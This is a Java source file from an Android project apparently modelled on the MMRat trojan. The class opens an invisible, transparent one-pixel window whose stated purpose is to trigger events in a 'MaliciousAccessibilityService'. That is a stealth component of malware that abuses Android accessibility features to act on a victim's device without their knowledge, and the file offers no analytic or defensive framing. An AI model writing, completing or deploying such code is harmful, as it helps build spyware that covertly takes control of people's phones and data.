package com.example.mmrat_wannabe;

import androidx.appcompat.app.AppCompatActivity;

import android.graphics.Color;
import android.graphics.drawable.ColorDrawable;
import android.os.Bundle;
import android.util.TypedValue;
import android.view.Gravity;
import android.view.Window;
import android.view.WindowManager;

//Purpose of this class is to trigger the onAccessibilityEvent in MaliciousAccessibilityService
public class SmallActivity extends AppCompatActivity {
    // Static variable to keep a reference to the current instance
    public static SmallActivity instance = null;
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_small);

        // Get the window for the activity
        Window window = getWindow();

        // Convert 1dp to pixels
        int pixels = (int) TypedValue.applyDimension(TypedValue.COMPLEX_UNIT_DIP, 1, getResources().getDisplayMetrics());

        // Set the size of the window
        WindowManager.LayoutParams params = window.getAttributes();
        params.width = pixels;
        params.height = pixels;

        // Set the window's background to transparent
        window.setBackgroundDrawable(new ColorDrawable(Color.TRANSPARENT));

        // Set the position of the window
        params.gravity = Gravity.TOP | Gravity.START;

        // Apply the new attributes to the window
        window.setAttributes(params);

        instance = this;
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();

        // Clear the static variable when the activity is destroyed
        instance = null;
    }

    // Static method to finish the activity
    public static void finishActivity() {
        if (instance != null) {
            instance.finish();
        }
    }

}